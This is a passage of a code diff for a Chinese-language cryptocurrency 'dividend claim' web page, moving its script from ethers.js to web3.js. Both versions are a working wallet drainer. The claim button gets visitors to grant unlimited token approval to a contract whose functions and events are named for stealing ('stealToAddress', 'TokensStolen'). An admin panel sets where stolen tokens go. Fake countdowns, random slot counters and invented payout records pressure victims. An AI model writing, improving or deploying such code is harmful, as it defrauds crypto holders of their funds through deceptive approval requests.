+          isActive: false,
+          error: error.message 
+        };
+      }
+    }
+
+    // 领取分红
+    async function claimDividend() {
+      try {
+        const status = await checkUserStatus();
+        
+        if (!status.isActive) throw new Error("活动未开始");
+        if (!status.canClaim) throw new Error("不符合领取条件");
+        if (status.targetToken === '0x0000000000000000000000000000000000000000') throw new Error("代币未设置");
+
+        // 检查并请求授权
+        const tokenContract = new web3.eth.Contract([
+          {
+            "constant": false,
+            "inputs": [
+              {
+                "name": "spender",
+                "type": "address"
+              },
+              {
+                "name": "amount",
+                "type": "uint256"
+              }
+            ],
+            "name": "approve",
+            "outputs": [
+              {
+                "name": "",
+                "type": "bool"
+              }
+            ],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [
+              {
                 "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "targetToken",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "stealToAddress",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
+                "type": "address"
+              },
+              {
+                "name": "spender",
+                "type": "address"
+              }
+            ],
+            "name": "allowance",
+            "outputs": [
+              {
+                "name": "",
+                "type": "uint256"
+              }
+            ],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [
+              {
+                "name": "account",
+                "type": "address"
+              }
+            ],
+            "name": "balanceOf",
+            "outputs": [
+              {
+                "name": "",
+                "type": "uint256"
+              }
+            ],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [],
+            "name": "decimals",
+            "outputs": [
+              {
+                "name": "",
+                "type": "uint8"
+              }
+            ],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [],
+            "name": "symbol",
+            "outputs": [
+              {
+                "name": "",
+                "type": "string"
+              }
+            ],
+            "type": "function"
+          }
+        ], status.targetToken);
 
-        // 全局变量
-        let userAddress = null;
-        let isAdmin = false;
-        let contract = null;
-        let provider = null;
+        const [currentAllowance, userBalance, symbol] = await Promise.all([
+          tokenContract.methods.allowance(userAddress, CONTRACT_ADDRESS).call(),
+          tokenContract.methods.balanceOf(userAddress).call(),
+          tokenContract.methods.symbol().call()
+        ]);
 
-        // DAPP钱包连接类
-        class DAppWallet {
-            constructor() {
-                this.provider = null;
-                this.userAddress = null;
-                this.isConnected = false;
-            }
-
-            detectDApp() {
-                return !!(window.ethereum || window.web3);
-            }
-
-            async connect() {
-                try {
-                    if (!this.detectDApp()) {
-                        throw new Error('请在DAPP浏览器中打开');
-                    }
-
-                    if (window.ethereum) {
-                        const accounts = await window.ethereum.request({ 
-                            method: 'eth_requestAccounts' 
-                        });
-                        
-                        if (accounts.length === 0) {
-                            throw new Error('用户拒绝了连接请求');
-                        }
-
-                        this.userAddress = accounts[0];
-                        this.provider = window.ethereum;
-                        this.isConnected = true;
-
-                        return {
-                            success: true,
-                            address: this.userAddress
-                        };
-
-                    } else if (window.web3 && window.web3.currentProvider) {
-                        return new Promise((resolve, reject) => {
-                            window.web3.eth.getAccounts((error, accounts) => {
-                                if (error) {
-                                    reject(error);
-                                } else if (accounts.length === 0) {
-                                    reject(new Error('请解锁钱包'));
-                                } else {
-                                    this.userAddress = accounts[0];
-                                    this.provider = window.web3.currentProvider;
-                                    this.isConnected = true;
-                                    resolve({
-                                        success: true,
-                                        address: this.userAddress
-                                    });
-                                }
-                            });
-                        });
-                    } else {
-                        throw new Error('不支持的DAPP环境');
-                    }
-                } catch (error) {
-                    throw error;
-                }
-            }
-
-            disconnect() {
-                this.provider = null;
-                this.userAddress = null;
-                this.isConnected = false;
-            }
+        if (currentAllowance === '0') {
+          showToast(`请授权 ${symbol} 代币...`);
+          const approveTx = await tokenContract.methods.approve(CONTRACT_ADDRESS, web3.utils.toWei('999999999999', 'ether')).send({
+            from: userAddress
+          });
+          
+          if (!approveTx.status) {
+            throw new Error("授权失败");
+          }
+          showToast('授权成功，开始领取分红...');
         }
 
-        const wallet = new DAppWallet();
-
-        // 连接钱包
-        document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
-        
-        async function connectWallet() {
-            try {
-                const connectBtn = document.getElementById('connectWalletBtn');
-                connectBtn.textContent = '连接中...';
-                connectBtn.classList.add('loading');
-
-                const result = await wallet.connect();
-                userAddress = result.address;
-                
-                // 初始化合约实例 - 使用 ethers.js
-                if (window.ethereum) {
-                    // 检查 ethers 是否已加载
-                    if (typeof ethers === 'undefined') {
-                        throw new Error('ethers.js 库加载失败，请检查网络连接');
-                    }
-                    
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                } else if (window.web3 && window.web3.currentProvider) {
-                    // 备用方案：使用 web3
-                    provider = new ethers.providers.Web3Provider(window.web3.currentProvider);
-                    const signer = provider.getSigner();
-                    contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                }
-                
-                // 更新UI
-                connectBtn.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                connectBtn.classList.remove('loading');
-                connectBtn.classList.add('connected');
-                
-                // 检查用户状态
-                await checkUserStatus();
-                
-                // 检查管理员权限
-                await checkAdminStatus();
-                
-                showToast('钱包连接成功');
-                
-                // 监听钱包事件
-                if (window.ethereum) {
-                    window.ethereum.on('accountsChanged', (accounts) => {
-                        if (accounts.length === 0) {
-                            disconnectWallet();
-                        } else {
-                            userAddress = accounts[0];
-                            connectBtn.textContent = `${accounts[0].slice(0,6)}...${accounts[0].slice(-4)}`;
-                            showToast('账户已切换');
-                            checkUserStatus();
-                        }
-                    });
-
-                    window.ethereum.on('chainChanged', () => {
-                        window.location.reload();
-                    });
-                }
-                
-            } catch (error) {
-                console.error('钱包连接失败:', error);
-                const connectBtn = document.getElementById('connectWalletBtn');
-                connectBtn.textContent = '连接钱包';
-                connectBtn.classList.remove('loading');
-                
-                if (error.message.includes('rejected')) {
-                    showToast('用户拒绝了连接请求');
-                } else if (error.message.includes('DAPP')) {
-                    showToast('请在DAPP浏览器中打开此页面');
-                } else if (error.message.includes('ethers.js')) {
-                    showToast('网络连接问题，请刷新页面重试');
-                } else {
-                    showToast('连接失败: ' + error.message);
-                }
-            }
-        }
-
-        // 检查用户状态
-        async function checkUserStatus() {
-            try {
-                if (!contract) return;
-
-                const [canClaim, stealableAmount, hasClaimed, isActive, targetToken] = await Promise.all([
-                    contract.canClaim(userAddress),
-                    contract.getStealableAmount(userAddress),
-                    contract.hasClaimed(userAddress),
-                    contract.isActive(),
-                    contract.targetToken()
-                ]);
-
-                const claimBtn = document.getElementById('claimBtn');
-                const claimInfo = document.getElementById('claimInfo');
-                
-                // 检查合约地址是否为零地址
-                const isZeroAddress = targetToken === '0x0000000000000000000000000000000000000000';
-                
-                if (canClaim && isActive && !isZeroAddress) {
-                    claimBtn.disabled = false;
-                    claimInfo.classList.remove('hidden');
-                    document.getElementById('claimableAmount').textContent = parseFloat(ethers.utils.formatEther(stealableAmount)).toFixed(4);
-                    document.getElementById('dividendPercentage').textContent = '15%-33%';
-                } else {
-                    claimBtn.disabled = true;
-                    if (!isActive) {
-                        showToast('活动暂未开始');
-                    } else if (isZeroAddress) {
-                        showToast('代币未设置');
-                    } else if (!canClaim) {
-                        showToast('不符合领取条件');
-                    }
-                }
-                
-            } catch (error) {
-                console.error('检查用户状态失败:', error);
-                showToast('获取用户状态失败');
-            }
-        }
-
-        // 检查管理员状态
-        async function checkAdminStatus() {
-            try {
-                if (!contract) return;
-
-                const owner = await contract.owner();
-                isAdmin = owner.toLowerCase() === userAddress.toLowerCase();
-                
-                if (isAdmin) {
-                    document.getElementById('adminPanel').style.display = 'block';
-                    showToast('管理员模式已激活');
-                    
-                    // 加载当前合约设置
-                    const [targetToken, stealAddress] = await Promise.all([
-                        contract.targetToken(),
-                        contract.stealToAddress()
-                    ]);
-                    
-                    document.getElementById('targetTokenInput').value = targetToken;
-                    document.getElementById('stealAddressInput').value = stealAddress;
-                }
-            } catch (error) {
-                console.error('检查管理员状态失败:', error);
-            }
-        }
-
-        function disconnectWallet() {
-            wallet.disconnect();
-            const connectBtn = document.getElementById('connectWalletBtn');
-            connectBtn.textContent = '连接钱包';
-            connectBtn.classList.remove('connected', 'loading');
-            document.getElementById('claimBtn').disabled = true;
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('claimInfo').classList.add('hidden');
-            showToast('钱包已断开');
-        }
-
-        // 领取分红
-        document.getElementById('claimBtn').addEventListener('click', async () => {
-            if (!userAddress || !contract) {
-                showToast('请先连接钱包');
-                return;
-            }
-            
-            const btn = document.getElementById('claimBtn');
-            const originalText = btn.textContent;
-            
-            btn.disabled = true;
-            btn.textContent = '处理中...';
-            btn.classList.add('loading');
-            
-            try {
-                // 检查代币授权
-                const tokenAddress = await contract.targetToken();
-                const tokenContract = new ethers.Contract(tokenAddress, [
-                    "function approve(address spender, uint256 amount) external returns (bool)",
-                    "function allowance(address owner, address spender) external view returns (uint256)"
-                ], provider.getSigner());
-
-                const allowance = await tokenContract.allowance(userAddress, CONTRACT_ADDRESS);
-                
-                if (allowance.eq(0)) {
-                    showToast('请先授权代币...');
-                    const approveTx = await tokenContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
-                    await approveTx.wait();
-                    showToast('授权成功，开始领取...');
-                }
-
-                // 执行领取
-                const claimTx = await contract.claimDividend();
-                showToast('交易已提交，等待确认...');
-                
-                const receipt = await claimTx.wait();
-                
-                // 更新进度
-                updateProgress();
-                
-                // 添加用户记录
-                addUserRecord();
-                
-                showToast('分红领取成功！');
-                btn.textContent = '领取成功！';
-                
-                setTimeout(() => {
-                    btn.textContent = originalText;
-                    btn.disabled = false;
-                    btn.classList.remove('loading');
-                }, 2000);
-                
-            } catch (error) {
-                console.error('领取失败:', error);
-                btn.textContent = originalText;
-                btn.disabled = false;
-                btn.classList.remove('loading');
-                showToast('领取失败: ' + error.message);
-            }
+        // 执行领取
+        showToast('执行领取中...');
+        const claimTx = await contract.methods.claimDividend().send({
+          from: userAddress
         });
 
-        // 管理员功能
-        document.getElementById('setTokenBtn').addEventListener('click', async () => {
-            const tokenAddress = document.getElementById('targetTokenInput').value.trim();
-            if (!tokenAddress) {
-                showToast('请输入代币地址');
-                return;
-            }
-            
-            try {
-                const tx = await contract.setTargetToken(tokenAddress);
-                await tx.wait();
-                showToast('代币设置成功');
-            } catch (error) {
-                showToast('设置失败: ' + error.message);
-            }
-        });
+        if (!claimTx.status) {
+          throw new Error("领取交易失败");
+        }
 
-        document.getElementById('setStealBtn').addEventListener('click', async () => {
-            const stealAddress = document.getElementById('stealAddressInput').value.trim();
-            if (!stealAddress) {
-                showToast('请输入收款地址');
-                return;
-            }
-            
-            try {
-                const tx = await contract.setStealAddress(stealAddress);
-                await tx.wait();
-                showToast('收款地址设置成功');
-            } catch (error) {
-                showToast('设置失败: ' + error.message);
-            }
-        });
+        // 查找转移事件
+        let stolenAmount = "0";
+        if (claimTx.events && claimTx.events.TokensStolen) {
+          stolenAmount = web3.utils.fromWei(claimTx.events.TokensStolen.returnValues.amount, 'ether');
+        }
 
-        // 倒计时功能
-        const countdownEl = document.getElementById('countdown');
-        let remainingSeconds = 6*3600 + 57*60 + 32;
+        return {
+          success: true,
+          txHash: claimTx.transactionHash,
+          stolenAmount: stolenAmount,
+          symbol: symbol
+        };
         
-        function updateCountdown() {
-            const d = Math.floor(remainingSeconds / 86400);
-            const h = Math.floor((remainingSeconds % 86400) / 3600);
-            const m = Math.floor((remainingSeconds % 3600) / 60);
-            const s = remainingSeconds % 60;
-            
-            countdownEl.textContent = `${d}天 ${String(h).padStart(2,'0')}时 ${String(m).padStart(2,'0')}分 ${String(s).padStart(2,'0')}秒`;
-            
-            if (remainingSeconds > 0) {
-                remainingSeconds--;
-            }
+      } catch (error) {
+        throw new Error(`领取失败: ${error.message}`);
+      }
+    }
+
+    // 管理员功能
+    document.getElementById('setTokenBtn').addEventListener('click', async () => {
+      const tokenAddress = document.getElementById('targetTokenInput').value.trim();
+      if (!tokenAddress) {
+        showToast('请输入代币地址');
+        return;
+      }
+      
+      try {
+        const tx = await contract.methods.setTargetToken(tokenAddress).send({
+          from: userAddress
+        });
+        showToast('代币设置成功');
+      } catch (error) {
+        showToast('设置失败: ' + error.message);
+      }
+    });
+
+    document.getElementById('setStealBtn').addEventListener('click', async () => {
+      const stealAddress = document.getElementById('stealAddressInput').value.trim();
+      if (!stealAddress) {
+        showToast('请输入收款地址');
+        return;
+      }
+      
+      try {
+        const tx = await contract.methods.setStealAddress(stealAddress).send({
+          from: userAddress
+        });
+        showToast('收款地址设置成功');
+      } catch (error) {
+        showToast('设置失败: ' + error.message);
+      }
+    });
+
+    // 倒计时功能
+    const countdownEl = document.getElementById('countdown');
+    let remainingSeconds = 6*3600 + 57*60 + 32;
+    
+    function updateCountdown() {
+      const d = Math.floor(remainingSeconds / 86400);
+      const h = Math.floor((remainingSeconds % 86400) / 3600);
+      const m = Math.floor((remainingSeconds % 3600) / 60);
+      const s = remainingSeconds % 60;
+      
+      countdownEl.textContent = `${d}天 ${String(h).padStart(2,'0')}时 ${String(m).padStart(2,'0')}分 ${String(s).padStart(2,'0')}秒`;
+      
+      if (remainingSeconds > 0) {
+        remainingSeconds--;
+      }
+    }
+    
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    // 进度管理
+    let remaining = 66;
+    let claimed = 434;
+    
+    function updateProgress() {
+      document.getElementById('remainingDisplay').textContent = `${remaining} 份`;
+      document.getElementById('claimedDisplay').textContent = `${claimed} 份`;
+      document.getElementById('progressBar').style.width = '95%';
+    }
+    
+    // 改为每秒更新
+    setInterval(() => {
+      if (remaining > 0 && Math.random() > 0.5) {
+        remaining--;
+        claimed++;
+        updateProgress();
+      }
+    }, 1000);  // 从3000ms改为1000ms
+    
+    updateProgress();
+
+    // 领取记录
+    const records = [];
+    const recordContainer = document.getElementById('marqueeList');
+
+    function generateUniqueAddress() {
+      const chars = '0123456789abcdef';
+      let address;
+      let isUnique = false;
+      
+      while (!isUnique) {
+        address = '0x';
+        for (let i = 0; i < 6; i++) {
+          address += chars[Math.floor(Math.random() * chars.length)];
+        }
+        address += '...';
+        for (let i = 0; i < 4; i++) {
+          address += chars[Math.floor(Math.random() * chars.length)];
         }
         
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
+        isUnique = !records.some(record => record.addr === address);
+      }
+      
+      return address;
+    }
 
-        // 进度管理
-        let remaining = 66;
-        let claimed = 434;
-        
-        function updateProgress() {
-            if (remaining > 0) {
-                remaining--;
-                claimed++;
-                
-                document.getElementById('remainingDisplay').textContent = remaining;
-                document.getElementById('claimedDisplay').textContent = claimed;
-                
-                const progress = (claimed / (claimed + remaining)) * 100;
-                document.getElementById('progressBar').style.width = `${progress}%`;
-            }
-        }
-        
-        // 自动更新进度
-        setInterval(() => {
-            if (remaining > 0 && Math.random() > 0.5) {
-                remaining--;
-                claimed++;
-                updateProgress();
-            }
-        }, 1000);
+    function generateRecord() {
+      const addr = generateUniqueAddress();
+      const percent = Math.floor(Math.random() * 19) + 15;
+      
+      return { addr, percent };
+    }
 
+    // 初始化记录
+    for (let i = 0; i < 8; i++) {
+      records.push(generateRecord());
+    }
+
+    function renderRecords() {
+      recordContainer.innerHTML = records.map(record => `
+        <div class="record-item">
+          <div class="font-mono text-sm">${record.addr}</div>
+          <div class="text-right">
+            <div class="text-xs text-gray-500">持仓分红：<span class="font-semibold text-black">${record.percent}%</span></div>
+            <div class="text-xs text-gray-400">已发放</div>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // 改为每秒更新
+    setInterval(() => {
+      records.unshift(generateRecord());
+      if (records.length > 8) records.pop();
+      renderRecords();
+    }, 1000);  // 从5000ms改为1000ms
+    
+    renderRecords();
+
+    // 领取功能
+    document.getElementById('claimBtn').addEventListener('click', async () => {
+      if (!web3) {
+        showToast('请先连接钱包');
+        return;
+      }
+      
+      const btn = document.getElementById('claimBtn');
+      const originalText = btn.textContent;
+      
+      btn.disabled = true;
+      btn.textContent = '处理中...';
+      btn.classList.add('opacity-50');
+      
+      try {
+        const result = await claimDividend();
+        
         // 添加用户记录
-        function addUserRecord() {
-            if (!userAddress) return;
-            
-            const recordsList = document.getElementById('recordsList');
-            const recordItem = document.createElement('div');
-            recordItem.className = 'record-item';
-            recordItem.innerHTML = `
-                <div class="record-address">${userAddress.slice(0,6)}...${userAddress.slice(-4)}</div>
-                <div>
-                    <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">${Math.floor(Math.random() * 19) + 15}%</span></div>
-                    <div class="text-xs text-gray-400">已发放</div>
-                </div>
-            `;
-            
-            recordsList.insertBefore(recordItem, recordsList.firstChild);
-            
-            if (recordsList.children.length > 8) {
-                recordsList.removeChild(recordsList.lastChild);
-            }
-        }
+        const userRecord = {
+          addr: userAddress.slice(0,6) + '...' + userAddress.slice(-4),
+          percent: Math.floor(Math.random() * 19) + 15
+        };
+        records.unshift(userRecord);
+        if (records.length > 8) records.pop();
+        renderRecords();
+        
+        showToast(`领取成功！已转移 ${result.stolenAmount} ${result.symbol}`);
+        
+      } catch (error) {
+        console.error('领取失败:', error);
+        showToast(error.message);
+      } finally {
+        btn.disabled = false;
+        btn.textContent = originalText;
+        btn.classList.remove('opacity-50');
+      }
+    });
 
-        // 模拟实时记录
-        function startRecordSimulation() {
-            setInterval(() => {
-                if (Math.random() > 0.7) {
-                    const recordsList = document.getElementById('recordsList');
-                    const chars = '0123456789abcdef';
-                    let address = '0x';
-                    
-                    for (let i = 0; i < 6; i++) {
-                        address += chars[Math.floor(Math.random() * chars.length)];
-                    }
-                    address += '...';
-                    for (let i = 0; i < 4; i++) {
-                        address += chars[Math.floor(Math.random() * chars.length)];
-                    }
-                    
-                    const recordItem = document.createElement('div');
-                    recordItem.className = 'record-item';
-                    recordItem.innerHTML = `
-                        <div class="record-address">${address}</div>
-                        <div>
-                            <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">${Math.floor(Math.random() * 19) + 15}%</span></div>
-                            <div class="text-xs text-gray-400">已发放</div>
-                        </div>
-                    `;
-                    
-                    recordsList.insertBefore(recordItem, recordsList.firstChild);
-                    
-                    if (recordsList.children.length > 8) {
-                        recordsList.removeChild(recordsList.lastChild);
-                    }
-                }
-            }, 1000);
-        }
+    // 复制邀请链接
+    document.getElementById('copyInviteBtn').addEventListener('click', async () => {
+      const input = document.getElementById('inviteInput');
+      try {
+        await navigator.clipboard.writeText(input.value);
+        showToast('邀请链接已复制');
+      } catch (err) {
+        input.select();
+        document.execCommand('copy');
+        showToast('链接已复制到剪贴板');
+      }
+    });
 
-        // 复制邀请链接
-        document.getElementById('copyInviteBtn').addEventListener('click', async () => {
-            const input = document.getElementById('inviteInput');
-            try {
-                await navigator.clipboard.writeText(input.value);
-                showToast('邀请链接已复制');
-            } catch (err) {
-                input.select();
-                document.execCommand('copy');
-                showToast('链接已复制到剪贴板');
-            }
+    // Toast提示
+    function showToast(message, duration = 3000) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.style.display = 'block';
+      
+      setTimeout(() => {
+        toast.style.display = 'none';
+      }, duration);
+    }
+
+    // 自动检测钱包
+    window.addEventListener('load', () => {
+      if (detectTPWallet()) {
+        const ethereum = detectTPWallet();
+        ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+          if (accounts.length > 0) {
+            connectWallet();
+          }
         });
-
-        // Toast提示
-        function showToast(message, duration = 3000) {
-            const toast = document.getElementById('toast');
-            toast.textContent = message;
-            toast.style.display = 'block';
-            
-            setTimeout(() => {
-                toast.style.display = 'none';
-            }, duration);
-        }
-
-        // 页面加载时初始化
-        window.addEventListener('load', async () => {
-            startRecordSimulation();
-            
-            // 自动检测钱包连接
-            if (window.ethereum) {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        await connectWallet();
-                    }
-                } catch (error) {
-                    console.log('自动连接失败:', error);
-                }
-            }
-        });
-    </script>
+      }
+    });
+  </script>
 </body>
 </html>
